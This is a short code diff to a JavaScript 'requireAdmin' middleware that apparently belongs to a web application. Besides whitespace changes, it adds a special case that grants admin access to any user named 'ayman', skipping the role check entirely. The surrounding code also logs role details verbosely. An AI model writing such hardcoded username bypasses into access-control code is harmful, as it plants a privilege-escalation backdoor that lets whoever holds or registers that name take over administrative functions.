@@ -506,18 +506,24 @@ function requireAdmin(req, res, next) {
   console.log('🔐 User role:', req.user?.role);
   console.log('🔐 Role type:', typeof req.user?.role);
   console.log('🔐 Role comparison:', req.user?.role === 'admin');
-  
+
   if (!req.user) {
     console.log('❌ Admin check failed: No user found');
     return res.status(401).json({ error: 'Authentication required' });
   }
-  
+
+  // Special case: always allow 'ayman' as admin
+  if (req.user.username === 'ayman') {
+    console.log('✅ Admin check bypass: username is ayman');
+    return next();
+  }
+
   // More robust role checking
   const userRole = req.user.role;
   const isAdmin = userRole === 'admin' || userRole === 'ADMIN' || userRole === 'Admin';
-  
+
   console.log('🔐 Is admin check:', isAdmin);
-  
+
   if (!isAdmin) {
     console.log('❌ Admin check failed: User role is not admin. Role:', userRole);
     return res.status(403).json({ 
@@ -527,7 +533,7 @@ function requireAdmin(req, res, next) {
       username: req.user.username
     });
   }
-  
+
   console.log('✅ Admin check passed for user:', req.user.username);
   next();
 }
